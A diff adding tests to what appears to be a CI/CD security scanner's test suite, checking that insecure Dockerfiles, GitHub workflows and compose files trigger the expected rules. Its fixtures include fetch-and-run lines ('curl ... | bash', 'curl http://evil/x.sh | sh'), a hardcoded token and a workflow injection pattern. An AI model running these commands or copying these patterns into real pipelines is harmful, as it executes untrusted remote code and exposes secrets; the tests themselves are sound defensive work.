@@ -391,6 +391,33 @@ def _tree() -> None:
     check("graph tree: package names are HTML-escaped", "<script>" not in tree_html(build_tree(g, "root:.", {}, {})["tree"]))
 
 
+@guarded("pipeline")
+def _pipeline() -> None:
+    from pipeline_analysis.ci import analyze_github_workflow, analyze_generic_ci
+    from pipeline_analysis.dockerfile import analyze_compose, analyze_dockerfile
+    bad = "FROM node:16\nARG NPM_TOKEN=supersecretvalue1\nADD https://e.com/t.tgz /o/\nRUN curl -sSL https://x.sh | bash\nCOPY .env /app/\nCMD [\"node\"]\n"
+    f, imgs = analyze_dockerfile(bad, "Dockerfile")
+    ids = {x.rule_id for x in f}
+    check("pipeline: insecure Dockerfile yields the expected rules (DF001/2, DF003 root, DF004 ADD url, DF005 curl|sh, DF006 secret, DF011 .env, DF012 EOL)",
+          {"DF003", "DF004", "DF005", "DF006", "DF011", "DF012"} <= ids and imgs and imgs[0]["kind"] == "official", str(sorted(ids)))
+    check("pipeline: credential values are never copied into findings", all("supersecretvalue1" not in (x.snippet + x.why + x.remediation + str(x.extra)) for x in f))
+    good = "FROM python:3.13-slim@sha256:" + "a" * 64 + "\nRUN useradd -m app\nUSER app\nCMD [\"python\"]\n"
+    check("pipeline: a pinned, non-root Dockerfile has no HIGH/CRITICAL finding", not [x for x in analyze_dockerfile(good, "Dockerfile")[0] if x.severity in ("HIGH", "CRITICAL")])
+    wf = ("on:\n  pull_request_target:\npermissions: write-all\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n"
+          "      - uses: x/y@main\n      - run: echo ${{ github.event.pull_request.title }}\n")
+    w, acts = analyze_github_workflow(wf, ".github/workflows/a.yml")
+    wid = {x.rule_id for x in w}
+    check("pipeline: workflow rules (pwn-request GHA002, permissions GHA004, unpinned GHA001, injection GHA003)", {"GHA001", "GHA002", "GHA003", "GHA004"} <= wid and len(acts) == 2, str(sorted(wid)))
+    pinned = "on: push\npermissions:\n  contents: read\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@" + "b" * 40 + "\n"
+    check("pipeline: SHA-pinned action with read-only permissions raises nothing", not analyze_github_workflow(pinned, ".github/workflows/b.yml")[0])
+    c, _ = analyze_compose("services:\n  a:\n    image: nginx:latest\n    privileged: true\n", "docker-compose.yml")
+    check("pipeline: compose privileged + latest detected", {"DC001", "DC002"} <= {x.rule_id for x in c})
+    g, _ = analyze_generic_ci("script:\n  - curl http://evil/x.sh | sh\n", ".gitlab-ci.yml")
+    check("pipeline: generic CI curl|sh and plain-HTTP fetch detected", {"CI001", "CI004"} <= {x.rule_id for x in g})
+    from pipeline_analysis.eol import eol_note
+    check("pipeline: end-of-life table flags node:16 / python:3.8 but not python:3.13 or unknown images", eol_note("node", "16") and eol_note("python", "3.8-slim") and not eol_note("python", "3.13") and not eol_note("myorg/node", "10"))
+
+
 @guarded("ground_truth")
 def _ground_truth() -> None:
     if OFFLINE:
